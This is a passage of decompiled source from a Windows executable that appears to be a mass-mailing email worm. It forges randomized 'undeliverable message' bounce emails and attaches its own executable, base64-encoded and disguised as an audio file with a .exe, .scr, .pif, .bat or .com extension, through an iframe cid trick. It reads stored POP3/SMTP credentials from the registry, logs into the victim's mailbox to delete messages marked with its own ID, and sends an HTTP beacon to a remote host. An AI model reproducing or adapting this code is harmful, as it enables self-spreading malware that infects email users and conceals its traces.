  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  const char *v12; // eax
  unsigned int v13; // eax
  unsigned int v14; // eax
  unsigned int v15; // eax
  unsigned int v16; // eax
  unsigned int v17; // eax
  unsigned int v18; // eax
  const char *v19; // eax
  unsigned int v20; // eax
  unsigned int v21; // eax
  unsigned int v22; // eax
  unsigned int v23; // eax
  unsigned int v24; // eax
  unsigned int v25; // eax
  unsigned int v26; // eax
  unsigned int v27; // eax
  unsigned int v28; // eax
  unsigned int v29; // eax
  unsigned int v30; // eax
  unsigned int v31; // eax
  unsigned int v32; // eax
  unsigned int v33; // eax
  unsigned int v34; // eax
  unsigned int v35; // eax
  const char *v36; // eax
  const char *v37; // eax
  unsigned int v38; // eax
  unsigned int v39; // eax
  const char *v40; // eax
  const char *v41; // eax
  unsigned int v42; // eax
  unsigned int v43; // eax
  unsigned int v44; // eax
  unsigned int v45; // eax
  unsigned int v46; // eax
  unsigned int v47; // eax
  unsigned int v48; // eax
  unsigned int v49; // eax
  unsigned int v50; // eax
  const char *v51; // eax
  unsigned int v52; // eax
  unsigned int v53; // eax
  const char *v54; // eax
  unsigned int v55; // eax
  unsigned int v56; // eax
  const char *v57; // eax
  unsigned int v58; // eax
  unsigned int v59; // eax
  unsigned int v60; // eax
  unsigned int v61; // eax
  CHAR v63[52]; // [esp+10h] [ebp-2B0h] BYREF
  char Source[20]; // [esp+44h] [ebp-27Ch] BYREF
  char v65[20]; // [esp+58h] [ebp-268h] BYREF
  char v66[52]; // [esp+6Ch] [ebp-254h] BYREF
  CHAR sz[500]; // [esp+A0h] [ebp-220h] BYREF
  char v68[20]; // [esp+294h] [ebp-2Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+2A8h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  *Destination = 0;
  Source[0] = 0;
  sz[0] = 0;
  v68[0] = 0;
  v65[0] = 0;
  v63[0] = 0;
  v1 = sub_406850(0xAu);
  sub_4068F4((int)v65, v1 + 5);
  strcat(Destination, aFrom);
  if ( sub_406840(0xFu) )
  {
    v2 = sub_406850(3u) - 1;
    if ( v2 )
    {
      v3 = v2 - 1;
      if ( v3 )
      {
        if ( v3 == 1 )
          strcat(sz, aAdmin);
      }
      else
      {
        strcat(sz, aAdministrator);
      }
    }
    else
    {
      strcat(sz, aPostmaster);
    }
  }
  else
  {
    if ( sub_406840(0x28u) )
    {
      v4 = !sub_406840(0x32u);
      v5 = aMicrosoft;
      if ( v4 )
        v5 = aMs;
      strcat(sz, v5);
    }
    v6 = sub_406850(5u) - 1;
    if ( v6 )
    {
      v7 = v6 - 1;
      if ( v7 )
      {
        v8 = v7 - 1;
        if ( v8 )
        {
          if ( v8 == 1 )
            strcat(sz, aInet);
        }
        else
        {
          strcat(sz, aNet_0);
        }
      }
      else
      {
        strcat(sz, aNetwork);
      }
    }
    else
    {
      strcat(sz, aInternet);
    }
    v9 = sub_406850(4u) - 1;
    if ( v9 )
    {
      v10 = v9 - 1;
      if ( v10 )
      {
        if ( v10 == 1 )
          strcat(sz, aEmail);
      }
      else
      {
        strcat(sz, aMessage);
      }
    }
    else
    {
      strcat(sz, aMail);
    }
    v11 = sub_406850(3u) - 1;
    if ( v11 )
    {
      if ( v11 == 1 )
        strcat(sz, aStorage);
    }
    else
    {
      strcat(sz, aDelivery);
    }
    v4 = !sub_406840(0x32u);
    v12 = aService;
    if ( v4 )
      v12 = aSystem_0;
    strcat(sz, v12);
  }
  if ( sub_406840(0x14u) )
    CharLowerA(sz);
  if ( sub_406840(0x5Fu) )
    strcat(Destination, sz);
  strcat(Destination, asc_410D30);
  sz[0] = 0;
  if ( sub_406840(0x1Eu) )
  {
    sz[0] = sub_406850(0x1Au) + 96;
    sz[1] = 0;
    strcat(sz, aMail_0);
  }
  else
  {
    v13 = sub_406850(7u) - 1;
    if ( v13 )
    {
      v14 = v13 - 1;
      if ( v14 )
      {
        v15 = v14 - 1;
        if ( v15 )
        {
          v16 = v15 - 1;
          if ( v16 )
          {
            v17 = v16 - 1;
            if ( v17 )
            {
              v18 = v17 - 1;
              if ( v18 )
              {
                if ( v18 == 1 )
                  strcat(sz, aMaster);
              }
              else
              {
                strcat(sz, aMailer);
              }
            }
            else
            {
              strcat(sz, aEmail_0);
            }
          }
          else
          {
            strcat(sz, aSmtp);
          }
        }
        else
        {
          strcat(sz, aWeb);
        }
      }
      else
      {
        strcat(sz, aMail_0);
      }
    }
    else
    {
      strcat(sz, aPost);
    }
  }
  switch ( sub_406850(9u) )
  {
    case 1u:
      strcat(sz, aService_0);
      break;
    case 2u:
      strcat(sz, aForm);
      break;
    case 3u:
      strcat(sz, aEngine);
      break;
    case 4u:
      strcat(sz, aAutomat);
      break;
    case 5u:
      strcat(sz, aRobot);
      break;
    case 6u:
      strcat(sz, aDaemon);
      break;
    case 7u:
      strcat(sz, aProgram_0);
      break;
    case 8u:
      strcat(sz, aRoutine);
      break;
    case 9u:
      strcat(sz, aBot);
      break;
    default:
      break;
  }
  strcat(sz, asc_410D24);
  switch ( sub_406850(9u) )
  {
    case 1u:
      strcpy(Source, aRocketmail);
      break;
    case 2u:
      strcpy(Source, aMicrosoft_1);
      break;
    case 3u:
      strcpy(Source, aBigfoot);
      break;
    case 4u:
      strcpy(Source, aAol);
      break;
    case 5u:
      strcpy(Source, aYahoo);
      break;
    case 6u:
      strcpy(Source, aFreemail);
      break;
    case 7u:
      strcpy(Source, aNetmail);
      break;
    case 8u:
      strcpy(Source, aAmerica);
      break;
    case 9u:
      strcpy(Source, aPuremail);
      break;
    default:
      break;
  }
  v4 = !sub_406840(0x46u);
  v19 = aCom;
  if ( v4 )
    v19 = aNet;
  strcat(Source, v19);
  strcat(sz, Source);
  if ( sub_406840(7u) )
    strcpy(sz, " ");
  strcat(Destination, sz);
  strcat(Destination, aTo);
  sz[0] = 0;
  v20 = sub_406850(6u) - 1;
  if ( v20 )
  {
    v21 = v20 - 1;
    if ( v21 )
    {
      v22 = v21 - 1;
      if ( v22 )
      {
        v23 = v22 - 1;
        if ( v23 )
        {
          v24 = v23 - 1;
          if ( v24 )
          {
            if ( v24 == 1 )
              strcat(sz, aEmail);
          }
          else
          {
            strcat(sz, aMail);
          }
        }
        else
        {
          strcat(sz, aInet);
        }
      }
      else
      {
        strcat(sz, aNet_0);
      }
    }
    else
    {
      strcat(sz, aInternet);
    }
  }
  else
  {
    strcat(sz, aNetwork);
  }
  v25 = sub_406850(4u) - 1;
  if ( v25 )
  {
    v26 = v25 - 1;
    if ( v26 )
    {
      v27 = v26 - 1;
      if ( v27 )
      {
        if ( v27 == 1 )
          strcat(sz, aClient);
      }
      else
      {
        strcat(sz, aRecipient);
      }
    }
    else
    {
      strcat(sz, aReceiver);
    }
  }
  else
  {
    strcat(sz, aUser);
  }
  if ( sub_406840(0x19u) )
    CharLowerA(sz);
  if ( sub_406840(8u) )
    strcpy(sz, " ");
  strcat(Destination, sz);
  strcat(Destination, asc_410D30);
  sz[0] = 0;
  v28 = sub_406850(4u) - 1;
  if ( v28 )
  {
    v29 = v28 - 1;
    if ( v29 )
    {
      v30 = v29 - 1;
      if ( v30 )
      {
        if ( v30 == 1 )
          strcat(sz, aClient_0);
      }
      else
      {
        strcat(sz, aRecipient_0);
      }
    }
    else
    {
      strcat(sz, aReceiver_0);
    }
  }
  else
  {
    strcat(sz, aUser_0);
  }
  strcat(sz, asc_410D24);
  v31 = sub_406850(6u) - 1;
  if ( v31 )
  {
    v32 = v31 - 1;
    if ( v32 )
    {
      v33 = v32 - 1;
      if ( v33 )
      {
        v34 = v33 - 1;
        if ( v34 )
        {
          v35 = v34 - 1;
          if ( v35 )
          {
            if ( v35 == 1 )
              strcat(sz, aEmail_0);
          }
          else
          {
            strcat(sz, aSmtp);
          }
        }
        else
        {
          strcat(sz, aMail_0);
        }
      }
      else
      {
        strcat(sz, aYour);
      }
    }
    else
    {
      strcat(sz, aMx);
    }
  }
  else
  {
    strcat(sz, aHome);
  }
  v4 = !sub_406840(0x41u);
  v36 = aServer;
  if ( v4 )
    v36 = aDomain;
  strcat(sz, v36);
  v4 = !sub_406840(0x50u);
  v37 = aCom;
  if ( v4 )
    v37 = aNet;
  strcat(sz, v37);
  if ( sub_406840(8u) )
    strcpy(sz, "  ");
  strcat(Destination, sz);
  strcat(Destination, aSubject_0);
  sz[0] = 0;
  if ( sub_406840(0x23u) )
  {
    v38 = sub_406850(4u) - 1;
    if ( v38 )
    {
      v39 = v38 - 1;
      if ( v39 )
      {
        if ( v39 == 1 )
          strcat(sz, aReturned);
      }
      else
      {
        strcat(sz, aUndeliverable);
      }
    }
    else
    {
      strcat(sz, aUndelivered);
    }
    v4 = !sub_406840(0x32u);
    v40 = aMail_1;
    if ( v4 )
      v40 = aMessage_0;
    strcat(sz, v40);
    if ( sub_406840(0x46u) )
    {
      if ( sub_406840(0x46u) )
        strcat(sz, ::Source);
      if ( sub_406840(0x32u) )
      {
        strcat(sz, aReturnedTo);
        v4 = !sub_406840(0x32u);
        v41 = aSender;
        if ( v4 )
          v41 = aMailer_0;
        strcat(sz, v41);
      }
      else
      {
        strcat(sz, aUserUnknown);
      }
    }
  }
  else
  {
    v42 = sub_406850(6u) - 1;
    if ( v42 )
    {
      v43 = v42 - 1;
      if ( v43 )
      {
        v44 = v43 - 1;
        if ( v44 )
        {
          if ( v44 == 1 )
            strcat(sz, aBug);
        }
        else
        {
          strcat(sz, aError);
        }
      }
      else
      {
        strcat(sz, aAbort);
      }
    }
    else
    {
      strcat(sz, aFailure);
    }
    v45 = sub_406850(6u) - 1;
    if ( v45 )
    {
      v46 = v45 - 1;
      if ( v46 )
      {
        v47 = v46 - 1;
        if ( v47 )
        {
          v48 = v47 - 1;
          if ( v48 )
          {
            v49 = v48 - 1;
            if ( v49 )
            {
              if ( v49 == 1 )
                strcat(sz, aLetter);
            }
            else
            {
              strcat(sz, aAdvice);
            }
          }
          else
          {
            strcat(sz, aMessage_0);
          }
        }
        else
        {
          strcat(sz, aAnnouncement);
        }
      }
      else
      {
        strcat(sz, aReport);
      }
    }
    else
    {
      strcat(sz, aNotice);
    }
  }
  if ( sub_406840(0x19u) )
    CharLowerA(sz);
  if ( sub_406840(8u) )
    sz[0] = 0;
  strcat(Destination, sz);
  if ( dword_41A6D8 )
  {
    strcat(Destination, aXId);
    strcat(Destination, (const char *)&byte_412E74);
  }
  strcat(Destination, aMimeVersion10C_0);
  strcat(Destination, v65);
  strcat(Destination, asc_410A0C);
  strcat(Destination, v65);
  strcat(Destination, aContentTypeTex_0);
  sz[0] = 0;
  strcat(sz, aHtmlHeadHeadBo);
  strcat(sz, aIframeSrc3dCid);
  v50 = sub_406850(0xAu);
  v51 = (const char *)sub_4068F4((int)v68, v50 + 5);
  strcat(sz, v51);
  strcat(sz, aHeight3d0Width);
  if ( sub_406840(0x1Eu) )
    strcat(sz, aBrBrHi);
  if ( sub_406840(0x14u) )
  {
    strcat(sz, aBrThisIsTheQma);
  }
  else if ( sub_406840(0x14u) )
  {
    strcat(sz, aBrMessageFrom);
    strcat(sz, Source);
    strcat(sz, aBr);
  }
  if ( sub_406840(0x3Cu) )
  {
    v52 = sub_406850(3u) - 1;
    if ( v52 )
    {
      v53 = v52 - 1;
      if ( v53 )
      {
        if ( v53 == 1 )
          strcat(sz, aBrIMSorry);
      }
      else
      {
        strcat(sz, aBrIMSorryToHav);
      }
    }
    else
    {
      strcat(sz, aBrIMAfraid);
    }
    if ( sub_406840(0x32u) )
      strcat(sz, aIWasnTAbleToDe);
    else
      strcat(sz, aTheMessageRetu);
    if ( sub_406840(0x32u) )
      strcat(sz, aToTheFollowing);
    else
      strcat(sz, aToOneOrMoreDes);
  }
  v4 = !sub_406840(0x32u);
  v54 = aBrBrBrUndelive;
  if ( v4 )
    v54 = aBrBrBrUndelive_0;
  strcat(sz, v54);
  v55 = sub_406850(3u) - 1;
  if ( v55 )
  {
    if ( v55 == 1 )
      strcat(sz, aMessage_1);
  }
  else
  {
    strcat(sz, aMail_2);
  }
  v56 = sub_406850(5u);
  sub_4068F4((int)v66, v56 + 5);
  wsprintfA(v63, "to <B>%s@%s</B>\r\n", v66, Source);
  strcat(sz, v63);
  if ( sub_406840(0x32u) )
    strcat(sz, aBrBrBrMessageF);
  strcat(sz, aBodyHtml);
  strcat(Destination, sz);
  sz[0] = 0;
  wsprintfA(sz, "--%s\r\nContent-Type: audio/x-", v65);
  v4 = !sub_406840(0xAu);
  v57 = aMidi;
  if ( v4 )
    v57 = aWav;
  strcat(sz, v57);
  strcat(sz, aName);
  v58 = sub_406850(5u);
  sub_4068F4((int)v63, v58 + 3);
  v63[0] = sub_406850(8u) + 96;
  strcat(sz, v63);
  strcat(sz, asc_410CD4);
  if ( sub_406840(0x55u) )
  {
    strcat(sz, aExe_0);
  }
  else
  {
    v59 = sub_406850(4u) - 1;
    if ( v59 )
    {
      v60 = v59 - 1;
      if ( v60 )
      {
        v61 = v60 - 1;
        if ( v61 )
        {
          if ( v61 == 1 )
            strcat(sz, aPif);
        }
        else
        {
          strcat(sz, aBat);
        }
      }
      else
      {
        strcat(sz, aScr);
      }
    }
    else
    {
      strcat(sz, aCom_0);
    }
  }
  strcat(sz, aContentTransfe_0);
  strcat(sz, v68);
  strcat(sz, asc_410830);
  strcat(Destination, sz);
  GetModuleFileNameA(0, sz, 0x1F4u);
  sub_404411(Destination, sz);
  sz[0] = 0;
  strcat(sz, asc_410898);
  strcat(sz, v65);
  strcat(sz, asc_410770);
  return strcat(Destination, sz);
}
// 41A6D8: using guessed type int dword_41A6D8;

//----- (0040436A) --------------------------------------------------------
int sub_40436A()
{
  if ( !sub_401946((int)dword_412F48, aWw2FceVutbrCz, 0x50u, hWnd) )
    return 0;
  sub_401B15(dword_412F48, 0);
  sub_401A9E(dword_412F48, aGetHttpWw2FceV);
  if ( sub_401B0D(dword_412F48) )
    WaitForSingleObject(hObject, 0x2710u);
  sub_4018D3((int)dword_412F48);
  return 1;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];

//----- (00404411) --------------------------------------------------------
int __cdecl sub_404411(char *Str, LPCSTR lpFileName)
{
  size_t v2; // esi
  HANDLE FileA; // eax
  _BYTE *v4; // eax
  _BYTE *v5; // edi
  int result; // eax
  DWORD v7; // eax
  int v8; // ecx
  int v9; // ecx
  int v10; // edx
  char v11; // dl
  size_t v12; // esi
  HANDLE hObject; // [esp+14h] [ebp-3Ch]
  int v14; // [esp+1Ch] [ebp-34h]
  unsigned int i; // [esp+20h] [ebp-30h]
  DWORD NumberOfBytesRead; // [esp+24h] [ebp-2Ch] BYREF
  int v17; // [esp+28h] [ebp-28h]
  size_t v18; // [esp+2Ch] [ebp-24h]
  DWORD nNumberOfBytesToRead; // [esp+30h] [ebp-20h]
  DWORD v20; // [esp+34h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+38h] [ebp-18h]

  NumberOfBytesRead = 0;
  v14 = 0;
  ms_exc.registration.TryLevel = 0;
  if ( Str )
  {
    if ( lpFileName )
    {
      v2 = strlen(Str);
      v18 = v2;
      FileA = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0, 0);
      hObject = FileA;
      if ( FileA != (HANDLE)-1 )
      {
        nNumberOfBytesToRead = GetFileSize(FileA, 0);
        v4 = operator new(nNumberOfBytesToRead + 2);
        v5 = v4;
        if ( !v4 )
        {
          CloseHandle(hObject);
          result = 0;
LABEL_6:
          ms_exc.registration.TryLevel = -1;
          return result;
        }
        ReadFile(hObject, v4, nNumberOfBytesToRead, &NumberOfBytesRead, 0);
        CloseHandle(hObject);
        v5[NumberOfBytesRead] = 0;
        v7 = 0;
        v20 = 0;
        v8 = v17;
LABEL_8:
        if ( v7 < nNumberOfBytesToRead )
        {
          for ( i = 0; ; ++i )
          {
            if ( i > 3 )
              goto LABEL_8;
            if ( i )
              break;
            LOBYTE(v8) = v5[v7];
            v8 = (v8 >> 2) & 0x3F;
            v17 = v8;
LABEL_20:
            if ( (unsigned int)v8 <= 0x19 )
            {
              v11 = v8 + 65;
LABEL_22:
              Str[v2] = v11;
              goto LABEL_31;
            }
            if ( (unsigned int)v8 <= 0x33 )
            {
              v11 = v8 + 71;
              goto LABEL_22;
            }
            if ( (unsigned int)v8 <= 0x3D )
            {
              v11 = v8 - 4;
              goto LABEL_22;
            }
            if ( v8 == 62 )
            {
              Str[v2] = 43;
            }
            else if ( v8 == 63 )
            {
              Str[v2] = 47;
            }
LABEL_31:
            if ( ++v14 == 76 )
            {
              v14 = 0;
              v12 = v2 + 1;
              Str[v12] = 13;
              v2 = v12 + 1;
              v18 = v2;
              Str[v2] = 10;
            }
            v18 = ++v2;
          }
          if ( i == 1 )
          {
            LOBYTE(v8) = v5[v7 + 1];
            v9 = (v8 >> 4) & 0xF;
            v10 = 16 * (v5[v7] & 3);
          }
          else
          {
            if ( i != 2 )
            {
              v8 = v5[v7] & 0x3F;
LABEL_15:
              v17 = v8;
              v20 = ++v7;
              goto LABEL_20;
            }
            v9 = 4 * (v5[v7] & 0xF);
            v10 = ((int)(unsigned __int8)v5[v7 + 1] >> 6) & 3;
          }
          v8 = v10 | v9;
          goto LABEL_15;
        }
        if ( nNumberOfBytesToRead % 3 == 1 )
        {
          Str[v2 - 2] = 61;
        }
        else if ( nNumberOfBytesToRead % 3 != 2 )
        {
LABEL_39:
          Str[v2] = 0;
          operator delete(v5);
          result = 1;
          goto LABEL_6;
        }
        Str[v2 - 1] = 61;
        goto LABEL_39;
      }
    }
  }
  return 0;
}
// 404560: conditional instruction was optimized away because ecx.4>=1Au
// 40456F: conditional instruction was optimized away because ecx.4>=34u
// 404507: conditional instruction was optimized away because %var_30.4==3

//----- (00404606) --------------------------------------------------------
int sub_404606()
{
  CHAR sz[100]; // [esp+Ch] [ebp-17F8h] BYREF
  int v2; // [esp+70h] [ebp-1794h]
  int i; // [esp+74h] [ebp-1790h]
  char Str[6000]; // [esp+78h] [ebp-178Ch] BYREF
  CHAR *v5; // [esp+17E8h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+17ECh] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  sub_401B15(dword_412F48, 1);
  if ( !sub_401946((int)dword_412F48, (char *)&byte_41A530, 0x6Eu, hWnd)
    && !sub_401946((int)dword_412F48, (char *)&byte_41A530, 0x6Eu, hWnd)
    || !sub_4048C6(0x2710u) )
  {
    dword_41A59C = 0;
LABEL_15:
    ms_exc.registration.TryLevel = -1;
    return 0;
  }
  wsprintfA(sz, "USER %s\r\n", (const char *)&byte_412E94);
  sub_401A9E(dword_412F48, sz);
  if ( !sub_4048C6(0x1B58u) )
    goto LABEL_14;
  wsprintfA(sz, "PASS %s\r\n", (const char *)&byte_41A5A0);
  sub_401A9E(dword_412F48, sz);
  if ( !sub_4048C6(0x1B58u)
    || (strcpy(sz, aStat), sub_401A9E(dword_412F48, sz), WaitForSingleObject(hObject, 0x3A98u) == 258)
    || (sub_401830((int)dword_412F48, sz, 0x63u), CharUpperA(sz), strncmp(sz, String2, 4u))
    || (v5 = &sz[4], v2 = atoi(&sz[4]), v2 <= 0) )
  {
LABEL_14:
    dword_41A59C = 0;
    goto LABEL_15;
  }
  for ( i = 1; i <= v2; ++i )
  {
    if ( !sub_401B0D(dword_412F48) )
      goto LABEL_14;
    sub_401B15(dword_412F48, 0);
    wsprintfA(sz, "TOP %d 30\r\n", i);
    sub_401A9E(dword_412F48, sz);
    if ( WaitForSingleObject(hObject, 0x4E20u) == 258 )
      goto LABEL_14;
    sub_401830((int)dword_412F48, Str, 0x176Fu);
    if ( strstr(Str, (const char *)&byte_412E74) )
    {
      sub_401B15(dword_412F48, 1);
      wsprintfA(sz, "DELE %d\r\n", i);
      sub_401A9E(dword_412F48, sz);
      WaitForSingleObject(hObject, 0x1B58u);
    }
  }
  sub_401A9E(dword_412F48, aQuit);
  Sleep(0x1F4u);
  sub_4018D3((int)dword_412F48);
  ms_exc.registration.TryLevel = -1;
  dword_41A59C = 0;
  return 0;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];
// 41A59C: using guessed type int dword_41A59C;

//----- (004048C6) --------------------------------------------------------
int __cdecl sub_4048C6(DWORD dwMilliseconds)
{
  char String1[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( !sub_401B0D(dword_412F48) )
    return 0;
  if ( WaitForSingleObject(hObject, dwMilliseconds) == 258
    || (sub_401830((int)dword_412F48, String1, 4u), _strcmpi(String1, String2)) )
  {
    sub_4018D3((int)dword_412F48);
    return 0;
  }
  return 1;
}
// 412F48: using guessed type SOCKET dword_412F48[7546];

//----- (00404925) --------------------------------------------------------
int sub_404925()
{
  sub_40492F();
  return atexit(sub_404945);
}

//----- (0040492F) --------------------------------------------------------
char *sub_40492F()
{
  return sub_404FDA((char *)dword_412F48);
}
// 412F48: using guessed type SOCKET dword_412F48[7546];

//----- (00404945) --------------------------------------------------------
void __cdecl sub_404945()
{
  if ( dword_412F48[0] )
    closesocket(dword_412F48[0]);
  WSACleanup();
  DeleteCriticalSection((LPCRITICAL_SECTION)&dword_412F48[7540]);
  CloseHandle(hObject);
}
// 412F48: using guessed type SOCKET dword_412F48[7546];

//----- (0040494F) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  struct _OSVERSIONINFOA VersionInformation; // [esp+Ch] [ebp-CCh] BYREF
  struct tagMSG Msg; // [esp+A0h] [ebp-38h] BYREF
  UINT WindowsDirectoryA; // [esp+BCh] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+C0h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  ::hInstance = hInstance;
  WindowsDirectoryA = GetWindowsDirectoryA(Buffer, 0x64u);
  Buffer[WindowsDirectoryA] = 0;
  memset(&VersionInformation.dwMajorVersion, 0, 0x90u);
  VersionInformation.dwOSVersionInfoSize = 148;
  if ( !GetVersionExA(&VersionInformation) )
    dword_41A66C = 1;
  dword_41A66C = VersionInformation.dwPlatformId != 2;
  SetErrorMode(0x8003u);
  if ( strlen(lpCmdLine) )
  {
    if ( _strcmpi(lpCmdLine, Parameters) )
    {
      if ( _strcmpi(lpCmdLine, aShowerror) )
        sub_406BE3(lpCmdLine);
      else
        sub_4069E2();
    }
  }
  else
  {
    sub_4089A1();
  }
  if ( sub_404A78() )
  {
    while ( GetMessageA(&Msg, 0, 0, 0) )
      DispatchMessageA(&Msg);
  }
  return 0;
}
// 41A66C: using guessed type int dword_41A66C;

//----- (00404A78) --------------------------------------------------------
int sub_404A78()
{
  int result; // eax
  char String1[100]; // [esp+Ch] [ebp-B0h] BYREF
  WNDCLASSEXA v2; // [esp+70h] [ebp-4Ch] BYREF
  UINT uElapse; // [esp+A0h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+A4h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( FindWindowA(WindowName, WindowName) )
    return 0;
  memset(&v2.style, 0, 0x2Cu);
  v2.cbSize = 48;
  v2.lpfnWndProc = sub_405067;
  v2.hInstance = hInstance;
  v2.lpszClassName = WindowName;
  if ( !RegisterClassExA(&v2) )
    return 0;
  hWnd = CreateWindowExA(0, WindowName, WindowName, 0xCF0000u, 250, 250, 300, 100, 0, 0, hInstance, 0);
  result = sub_406DCD(Destination);
  if ( result )
  {
    if ( sub_40679E(HKEY_LOCAL_MACHINE, Destination, aEmailAddress, &Data)
      && sub_40679E(HKEY_LOCAL_MACHINE, Destination, aServer_0, &cp) )
    {
      dword_41A670 = 1;
    }
    sub_40679E(HKEY_LOCAL_MACHINE, Destination, aZipname, byte_412F38);
    sub_40679E(HKEY_LOCAL_MACHINE, Destination, aVicname, byte_412DD8);
    sub_40679E(HKEY_LOCAL_MACHINE, Destination, aCacheboxOutfit, (LPBYTE)String1);
    if ( !_strcmpi(String1, String) )
      dword_412E0C = 1;
    sub_40679E(HKEY_LOCAL_MACHINE, Destination, aCounterVisited, (LPBYTE)String1);
    if ( !_strcmpi(String1, String) )
      dword_412F34 = 1;
    if ( sub_40679E(HKEY_LOCAL_MACHINE, Destination, aLogin, &byte_412E94)
      && sub_40679E(HKEY_LOCAL_MACHINE, Destination, aPass, &byte_41A5A0)
      && sub_40679E(HKEY_LOCAL_MACHINE, Destination, aPopServer, &byte_41A530)
      && sub_40679E(HKEY_LOCAL_MACHINE, Destination, aXId_0, &byte_412E74) )
    {
      dword_41A6D8 = 1;
    }
    if ( !dword_41A670 || (uElapse = 20000, !dword_412E0C) )
      uElapse = 120000;
    nIDEvent = SetTimer(0, 0, uElapse, TimerFunc);
    dword_41A598 = SetTimer(0, 0, 0xAFC8u, sub_40133B);
    sub_40133B(0, 0, 0, 0);
    sub_406A51();
    if ( dword_41A670 )
      TimerFunc(0, 0, 0, 0);
    result = 1;
  }
  ms_exc.registration.TryLevel = -1;
  return result;
}
// 412DD8: using guessed type BYTE byte_412DD8[52];
// 412E0C: using guessed type int dword_412E0C;
// 412F34: using guessed type int dword_412F34;
// 412F38: using guessed type BYTE byte_412F38[16];
// 41A598: using guessed type int dword_41A598;
// 41A670: using guessed type int dword_41A670;
// 41A6D8: using guessed type int dword_41A6D8;

//----- (00404CF5) --------------------------------------------------------
void __stdcall TimerFunc(HWND a1, UINT a2, UINT_PTR a3, DWORD a4)
{
  HANDLE v4; // eax
  int (*lpStartAddress)(); // [esp+Ch] [ebp-20h]
  DWORD ThreadId; // [esp+10h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+14h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( !dword_41A59C )
  {
    if ( !dword_412E0C )
    {
      dword_41A59C = 1;
      sub_40772C(0);
      if ( dword_412E0C )
      {
        if ( dword_41A670 )
          SetTimer(0, nIDEvent, 0x4E20u, TimerFunc);
      }
LABEL_6:
      dword_41A59C = 0;
      return;
    }
    if ( dword_41A670 )
    {
      if ( sub_406F04() )
      {
        if ( !dword_412F34 )
        {
          dword_41A59C = 1;
          if ( sub_40436A() )
            sub_4066EB(HKEY_LOCAL_MACHINE, Destination, aCounterVisited, 1u, String);
          dword_412F34 = 1;
          dword_41A59C = 0;
        }
        if ( !dword_41A6D8 || (lpStartAddress = sub_404606, dword_41A604 % 0x14u) )
          lpStartAddress = sub_401E2D;
        ++dword_41A604;
        dword_41A59C = 1;
        v4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, 0, 0, &ThreadId);
        dword_412EFC = (int)v4;
        if ( !v4 )
          goto LABEL_6;
        CloseHandle(v4);
      }
    }
    else
    {
      dword_41A59C = 1;
      DialogBoxParamA(hInstance, (LPCSTR)0x65, 0, DialogFunc, 0);
      if ( dword_41A670 )
        SetTimer(0, nIDEvent, 0x4E20u, TimerFunc);
    }
  }
}
// 412E0C: using guessed type int dword_412E0C;
// 412EFC: using guessed type int dword_412EFC;
// 412F34: using guessed type int dword_412F34;
// 41A59C: using guessed type int dword_41A59C;
// 41A604: using guessed type int dword_41A604;
// 41A670: using guessed type int dword_41A670;
// 41A6D8: using guessed type int dword_41A6D8;

//----- (00404E8E) --------------------------------------------------------
INT_PTR __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)
{
  HWND DlgItem; // eax
  BOOL v6; // [esp-4h] [ebp-8Ch]
  CHAR String[97]; // [esp+Ch] [ebp-7Ch] BYREF
  __int16 v8; // [esp+6Dh] [ebp-1Bh]
  char v9; // [esp+6Fh] [ebp-19h]
  CPPEH_RECORD ms_exc; // [esp+70h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( a2 == 272 )
  {
    ShowWindow(hDlg, 5);
    goto LABEL_8;
  }
  if ( a2 == 273 && (unsigned __int16)a3 >= 0x3EBu )
  {
    if ( (unsigned __int16)a3 <= 0x3ECu )
    {
      if ( HIWORD(a3) == 1024 )
      {
        memset(String, 0, sizeof(String));
        v8 = 0;
        v9 = 0;
        GetDlgItemTextA(hDlg, 1003, String, 100);
        v6 = 0;
        if ( strlen(String) )
        {
          String[0] = 0;
          GetDlgItemTextA(hDlg, 1004, String, 100);
          if ( strlen(String) )
            v6 = 1;
        }
        DlgItem = GetDlgItem(hDlg, 1005);
        EnableWindow(DlgItem, v6);
      }
      goto LABEL_8;
    }
    if ( (unsigned __int16)a3 == 1005 )
    {
      if ( sub_4070C1(hDlg) )
      {
        dword_41A670 = 1;
        dword_41A59C = 0;
        EndDialog(hDlg, 1);
      }
      goto LABEL_8;
    }
    if ( (unsigned __int16)a3 == 1006 )
    {
      dword_41A59C = 0;
      EndDialog(hDlg, 0);
LABEL_8:
      ms_exc.registration.TryLevel = -1;
      return 1;
    }
  }
  return 0;
}
// 41A59C: using guessed type int dword_41A59C;
// 41A670: using guessed type int dword_41A670;

//----- (00404FDA) --------------------------------------------------------
char *__thiscall sub_404FDA(char *this)
{
  struct WSAData WSAData; // [esp+8h] [ebp-190h] BYREF

  WSAStartup(0x101u, &WSAData);
  this[4] = 0;
  *((_DWORD *)this + 7501) = 1;
  this[30008] = 0;
  *((_WORD *)this + 15079) = 0;
  *(_DWORD *)this = 0;
  InitializeCriticalSection((LPCRITICAL_SECTION)(this + 30160));
  hObject = CreateEventA(0, 0, 0, 0);
  return this;
}

//----- (00405067) --------------------------------------------------------
LRESULT __stdcall sub_405067(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
  if ( Msg == 2 )
    goto LABEL_8;
  if ( Msg != 1044 )
    return DefWindowProcA(hWnd, Msg, wParam, lParam);
  if ( (unsigned __int8)lParam == 1 )
  {
    sub_40166C((int)dword_412F48);
    return 0;
  }
